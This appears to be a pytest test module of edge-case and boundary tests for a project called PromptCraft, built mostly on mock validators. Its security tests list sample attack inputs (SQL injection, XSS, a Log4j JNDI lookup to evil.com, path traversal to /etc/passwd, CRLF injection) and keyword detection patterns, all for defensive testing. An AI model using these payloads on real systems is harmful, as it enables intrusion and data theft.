"""Comprehensive parametrized edge case testing patterns.

This module implements systematic edge case testing for critical PromptCraft components
using pytest parametrization for comprehensive boundary condition coverage.
"""

import json
import threading
import time
from queue import Queue
from typing import Any

import pytest
from pydantic import ValidationError

# Import application components with graceful fallbacks
try:
    from src.config.settings import ApplicationSettings
    from src.config.validation import validate_configuration_on_startup
except ImportError:
    # Fallback implementations for testing
    class ApplicationSettings:
        def __init__(self, **kwargs):
            for key, value in kwargs.items():
                setattr(self, key, value)

    def validate_configuration_on_startup(settings):
        if not hasattr(settings, "app_name"):
            raise ValueError("Missing required 'app_name' field")


class TestConfigurationValidationEdgeCases:
    """Test configuration validation with comprehensive edge cases."""

    @pytest.mark.parametrize(
        ("config_input", "expected_error"),
        [
            # Invalid configuration structures - extra="forbid" mode rejects unknown fields
            ({"invalid": "config"}, (ValueError, ValidationError)),
            ({}, None),  # Empty config is valid - uses defaults
            (None, (AttributeError,)),  # validate_configuration_on_startup(None) raises AttributeError
            ([], (AttributeError,)),  # validate_configuration_on_startup([]) raises AttributeError
            ("string_config", (AttributeError,)),  # validate_configuration_on_startup("string") raises AttributeError
            (123, (AttributeError,)),  # validate_configuration_on_startup(123) raises AttributeError
            # Edge case values
            ({"app_name": ""}, (ValueError, ValidationError)),
            ({"app_name": None}, (TypeError, ValidationError)),
            pytest.param(
                {"app_name": "a" * 1000},
                (ValueError, ValidationError),
                id="very-long-name",
            ),  # Very long name (over 100 char limit)
            ({"app_name": "\x00\x01"}, (ValueError, ValidationError)),  # Binary data
            ({"app_name": "🚀🔥💯"}, (ValueError, ValidationError)),  # Unicode not allowed in app_name validation
            # Missing required fields
            ({"environment": "dev"}, None),  # Valid environment but missing app_name (should use default)
            ({"app_name": "test"}, None),  # Minimal valid config
        ],
        ids=[
            "invalid-config",
            "empty-config",
            "null-config",
            "list-config",
            "string-config",
            "number-config",
            "empty-name",
            "null-name",
            None,  # Will use pytest.param id
            "binary-name",
            "unicode-name",
            "missing-name",
            "minimal-valid",
        ],
    )
    def test_configuration_validation_edge_cases(self, config_input: Any, expected_error: tuple | None) -> None:
        """Test configuration validation with various edge cases."""

        def _create_and_validate_settings():
            if config_input is None:
                # Passing None to validate_configuration_on_startup should raise AttributeError
                validate_configuration_on_startup(config_input)
            elif isinstance(config_input, dict):
                # Dict inputs should work with ApplicationSettings(**config_input)
                settings = ApplicationSettings(**config_input)
                validate_configuration_on_startup(settings)
            else:
                # Non-dict, non-None inputs should fail when passed to validate_configuration_on_startup
                validate_configuration_on_startup(config_input)

        if expected_error:
            with pytest.raises(expected_error):
                _create_and_validate_settings()
        else:
            # Should not raise an exception
            try:
                _create_and_validate_settings()
            except Exception as e:
                pytest.fail(f"Unexpected exception raised: {e}")


class TestInputSanitizationBoundaries:
    """Test input sanitization with boundary conditions."""

    @pytest.mark.parametrize(
        "input_data",
        [
            "",  # Empty input
            "a",  # Single character
            "a" * 10,  # Small input
            pytest.param("a" * 1000, id="medium-input"),  # Medium input
            pytest.param("a" * 10000, id="large-input"),  # Large input
            pytest.param("a" * 100000, id="very-large-input"),  # Very large input
            "\x00\x01",  # Binary data
            "🚀🔥💯",  # Unicode/emoji
            "\n\r\t",  # Whitespace characters
            "SELECT * FROM users;",  # SQL-like input
            "<script>alert('xss')</script>",  # XSS-like input
            "../../../etc/passwd",  # Path traversal
            "${jndi:ldap://evil.com/a}",  # Log4j-style injection
        ],
        ids=[
            "empty-input",
            "single-char",
            "small-input",
            None,  # Will use pytest.param id
            None,  # Will use pytest.param id
            None,  # Will use pytest.param id
            "binary-input",
            "unicode-input",
            "whitespace-input",
            "sql-like",
            "xss-like",
            "path-traversal",
            "log4j-style",
        ],
    )
    def test_input_sanitization_boundaries(self, input_data: str) -> None:
        """Test input sanitization with boundary conditions."""

        # Mock sanitization function since actual implementation may not exist
        def mock_sanitize_input(data: Any) -> str:
            if data is None:
                return ""
            if not isinstance(data, str):
                data = str(data)
            # Basic sanitization logic
            if len(data) > 10000:
                return data[:10000]
            return data.replace("\x00", "").replace("\x01", "")

        result = mock_sanitize_input(input_data)

        # Assertions
        assert isinstance(result, str), "Sanitized input must be string"
        assert len(result) <= 10000, "Sanitized input must not exceed max length"
        assert "\x00" not in result, "Null bytes should be removed"
        assert "\x01" not in result, "Control characters should be removed"


class TestQueryProcessingEdgeCases:
    """Test query processing with edge cases."""

    @pytest.mark.parametrize(
        ("query_input", "context", "expected_behavior"),
        [
            # Query variations
            ("", "context", "handle_empty_query"),
            pytest.param("a" * 10000, "context", "handle_long_query", id="long-query"),
            (None, "context", "handle_null_query"),
            ("normal query", "", "handle_empty_context"),
            ("normal query", None, "handle_null_context"),
            ("🚀 unicode query", "🔥 unicode context", "handle_unicode"),
            # JSON-like queries
            ('{"malformed": json}', "context", "handle_malformed_json"),
            ('{"valid": "json"}', "context", "handle_valid_json"),
            # Special characters
            ("query with \n newlines", "context", "handle_newlines"),
            ("query\twith\ttabs", "context", "handle_tabs"),
            ("query with <tags>", "context", "handle_html_tags"),
        ],
        ids=[
            "empty-query",
            None,  # Will use pytest.param id
            "null-query",
            "empty-context",
            "null-context",
            "unicode-content",
            "malformed-json",
            "valid-json",
            "newlines",
            "tabs",
            "html-tags",
        ],
    )
    def test_query_processing_edge_cases(self, query_input: Any, context: Any, expected_behavior: str) -> None:
        """Test query processing with various edge cases."""

        # Mock query processor since actual implementation may not exist
        def mock_process_query(query: Any, context: Any) -> dict[str, Any]:
            if query is None or query == "":
                return {"error": "empty_or_null_query", "status": "error"}
            if context is None or context == "":
                return {"error": "empty_or_null_context", "status": "error"}
            if len(str(query)) > 5000:
                return {"error": "query_too_long", "status": "error"}
            return {"result": "processed", "status": "success"}

        result = mock_process_query(query_input, context)

        # Validate result structure
        assert isinstance(result, dict), "Result must be dictionary"
        assert "status" in result, "Result must have status field"
        assert result["status"] in ["success", "error"], "Status must be success or error"

        # Behavior-specific assertions
        if expected_behavior == "handle_empty_query":
            assert result["status"] == "error"
            assert "empty_or_null_query" in result.get("error", "")
        elif expected_behavior == "handle_long_query":
            assert result["status"] == "error"
            assert "query_too_long" in result.get("error", "")
        elif expected_behavior in ["handle_empty_context", "handle_null_context"]:
            assert result["status"] == "error"
            assert "empty_or_null_context" in result.get("error", "")
        # For valid cases, should succeed
        elif query_input and context and len(str(query_input)) <= 5000:
            assert result["status"] == "success"


class TestErrorHandlingEdgeCases:
    """Test error handling with various failure scenarios."""

    @pytest.mark.parametrize(
        ("error_type", "error_message", "expected_handling"),
        [
            (ConnectionError, "Network unreachable", "network_error"),
            (TimeoutError, "Request timeout", "timeout_error"),
            (ValueError, "Invalid input", "validation_error"),
            (KeyError, "Missing key", "missing_data_error"),
            (PermissionError, "Access denied", "permission_error"),
            (FileNotFoundError, "File not found", "file_error"),
            (json.JSONDecodeError, "Invalid JSON", "json_error"),
            (Exception, "Unknown error", "generic_error"),
        ],
        ids=[
            "network-error",
            "timeout-error",
            "validation-error",
            "missing-data-error",
            "permission-error",
            "file-error",
            "json-error",
            "generic-error",
        ],
    )
    def test_error_handling_edge_cases(self, error_type: type, error_message: str, expected_handling: str) -> None:
        """Test error handling with various exception types."""

        # Mock error handler since actual implementation may not exist
        def mock_handle_error(error: Exception) -> dict[str, Any]:
            error_mappings = {
                ConnectionError: "network_error",
                TimeoutError: "timeout_error",
                ValueError: "validation_error",
                KeyError: "missing_data_error",
                PermissionError: "permission_error",
                FileNotFoundError: "file_error",
                json.JSONDecodeError: "json_error",
            }

            error_category = error_mappings.get(type(error), "generic_error")
            return {"error_type": error_category, "message": str(error), "handled": True}

        # Simulate the error
        if error_type == json.JSONDecodeError:
            test_error = json.JSONDecodeError(error_message, doc="", pos=0)
        else:
            test_error = error_type(error_message)
        result = mock_handle_error(test_error)

        # Validate error handling
        assert result["error_type"] == expected_handling
        assert result["handled"] is True
        assert error_message in result["message"]


class TestPerformanceBoundaryConditions:
    """Test performance with boundary conditions."""

    @pytest.mark.parametrize(
        "data_size",
        [
            0,  # Empty data
            1,  # Minimal data
            100,  # Small data
            1000,  # Medium data
            10000,  # Large data
        ],
        ids=["empty", "minimal", "small", "medium", "large"],
    )
    def test_processing_performance_boundaries(self, data_size: int, performance_metrics) -> None:
        """Test processing performance with various data sizes."""
        # Generate test data
        test_data = ["item_" + str(i) for i in range(data_size)]

        # Mock processing function
        def mock_process_data(data: list[str]) -> dict[str, Any]:
            # Simulate processing time proportional to data size
            time.sleep(len(data) * 0.0001)  # 0.1ms per item
            return {"processed_count": len(data), "status": "success"}

        # Measure performance
        performance_metrics.start()
        result = mock_process_data(test_data)
        performance_metrics.stop()

        # Validate result
        assert result["processed_count"] == data_size
        assert result["status"] == "success"

        # Performance assertions (adjust thresholds as needed)
        if data_size == 0:
            performance_metrics.assert_max_duration(0.1)  # Empty should be very fast
        elif data_size <= 100:
            performance_metrics.assert_max_duration(0.5)  # Small data should be fast
        elif data_size <= 1000:
            performance_metrics.assert_max_duration(2.0)  # Medium data
        else:
            performance_metrics.assert_max_duration(5.0)  # Large data


class TestSecurityEdgeCases:
    """Test security-related edge cases."""

    @pytest.mark.parametrize(
        ("input_data", "security_concern"),
        [
            # Injection attempts
            ("'; DROP TABLE users; --", "sql_injection"),
            ("<script>alert('xss')</script>", "xss_attempt"),
            ("{{7*7}}", "template_injection"),
            ("${jndi:ldap://evil.com/a}", "log4j_injection"),
            ("../../../etc/passwd", "path_traversal"),
            ("%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd", "encoded_path_traversal"),
            # Large payloads (potential DoS)
            pytest.param("A" * 1000000, "large_payload", id="large-payload"),
            # Special characters
            ("\x00admin\x00", "null_byte_injection"),
            ("admin\r\nSet-Cookie: evil=1", "crlf_injection"),
        ],
        ids=[
            "sql-injection",
            "xss-attempt",
            "template-injection",
            "log4j-injection",
            "path-traversal",
            "encoded-path-traversal",
            None,  # Will use pytest.param id
            "null-byte-injection",
            "crlf-injection",
        ],
    )
    def test_security_input_validation(self, input_data: str, security_concern: str) -> None:
        """Test security input validation with various attack patterns."""

        # Mock security validator
        def mock_validate_input(data: str) -> dict[str, Any]:
            security_patterns = {
                "sql_injection": ["drop", "select", "insert", "delete", "union", "--"],
                "xss_attempt": ["<script", "javascript:", "onerror=", "onload="],
                "template_injection": ["{{", "}}", "${", "}"],
                "log4j_injection": ["jndi:", "ldap://", "rmi://"],
                "path_traversal": ["../", "..\\", "%2e%2e"],
                "null_byte_injection": ["\x00"],
                "crlf_injection": ["\r\n", "\n\r"],
            }

            data_lower = data.lower()
            detected_threats = []

            for threat_type, patterns in security_patterns.items():
                for pattern in patterns:
                    if pattern.lower() in data_lower:
                        detected_threats.append(threat_type)
                        break

            # Check payload size
            if len(data) > 100000:
                detected_threats.append("large_payload")

            return {
                "input": data[:100] + "..." if len(data) > 100 else data,
                "threats_detected": detected_threats,
                "is_safe": len(detected_threats) == 0,
                "sanitized": data.replace("\x00", "").replace("\r\n", " ")[:1000],
            }

        result = mock_validate_input(input_data)

        # Validate security check result
        assert isinstance(result, dict)
        assert "threats_detected" in result
        assert "is_safe" in result
        assert "sanitized" in result

        # Should detect the expected security concern
        if security_concern != "large_payload":  # Large payload might not trigger other patterns
            assert security_concern in result["threats_detected"] or len(result["threats_detected"]) > 0

        # Sanitized output should be safer
        assert len(result["sanitized"]) <= 1000
        assert "\x00" not in result["sanitized"]


class TestConcurrencyEdgeCases:
    """Test concurrency and thread safety edge cases."""

    @pytest.mark.parametrize("concurrent_requests", [1, 5, 10, 50], ids=["single", "few", "medium", "many"])
    def test_concurrent_processing(self, concurrent_requests: int) -> None:
        """Test concurrent request processing."""
        results = Queue()

        def mock_process_request(request_id: int) -> None:
            # Simulate processing
            time.sleep(0.01)  # 10ms processing time
            results.put({"request_id": request_id, "status": "completed"})

        # Start concurrent threads
        threads = []
        for i in range(concurrent_requests):
            thread = threading.Thread(target=mock_process_request, args=(i,))
            threads.append(thread)
            thread.start()

        # Wait for all threads to complete
        for thread in threads:
            thread.join(timeout=5.0)  # 5 second timeout

        # Validate results
        completed_results = []
        while not results.empty():
            completed_results.append(results.get())

        assert len(completed_results) == concurrent_requests

        # Check all requests were processed
        request_ids = {result["request_id"] for result in completed_results}
        expected_ids = set(range(concurrent_requests))
        assert request_ids == expected_ids

        # All should be completed
        assert all(result["status"] == "completed" for result in completed_results)


# Edge case testing for configuration edge cases using conftest.py fixtures
class TestConfigurationEdgeCasesWithFixtures:
    """Test configuration using parametrized fixtures from conftest.py."""

    def test_configuration_edge_cases_with_fixtures(self, config_edge_cases) -> None:
        """Test configuration validation using parametrized fixtures."""

        # This test uses the config_edge_cases fixture from conftest.py
        def mock_validate_config(config: Any) -> bool:
            if config is None:
                return False
            if not isinstance(config, dict):
                return False
            if not config:  # Empty dict
                return False
            # Only {"valid": "config"} is considered valid
            return config == {"valid": "config"}

        result = mock_validate_config(config_edge_cases)

        # Valid configurations should pass
        if config_edge_cases == {"valid": "config"}:
            assert result is True
        else:
            # Invalid configurations should fail
            assert result is False

    def test_input_edge_cases_with_fixtures(self, edge_case_inputs) -> None:
        """Test input handling using parametrized fixtures."""

        # This test uses the edge_case_inputs fixture from conftest.py
        def mock_handle_input(input_data: Any) -> dict[str, Any]:
            if input_data is None:
                return {"status": "null_input", "processed": False}
            if isinstance(input_data, str) and len(input_data) == 0:
                return {"status": "empty_input", "processed": False}
            if isinstance(input_data, str) and len(input_data) > 5000:
                return {"status": "input_too_large", "processed": False}
            return {"status": "processed", "processed": True, "type": type(input_data).__name__}

        result = mock_handle_input(edge_case_inputs)

        # Validate result structure
        assert isinstance(result, dict)
        assert "status" in result
        assert "processed" in result

        # Check handling based on input type
        if edge_case_inputs is None:
            assert result["status"] == "null_input"
            assert result["processed"] is False
        elif isinstance(edge_case_inputs, str) and len(edge_case_inputs) == 0:
            assert result["status"] == "empty_input"
            assert result["processed"] is False
        elif isinstance(edge_case_inputs, str) and len(edge_case_inputs) > 5000:
            assert result["status"] == "input_too_large"
            assert result["processed"] is False
        else:
            assert result["status"] == "processed"
            assert result["processed"] is True
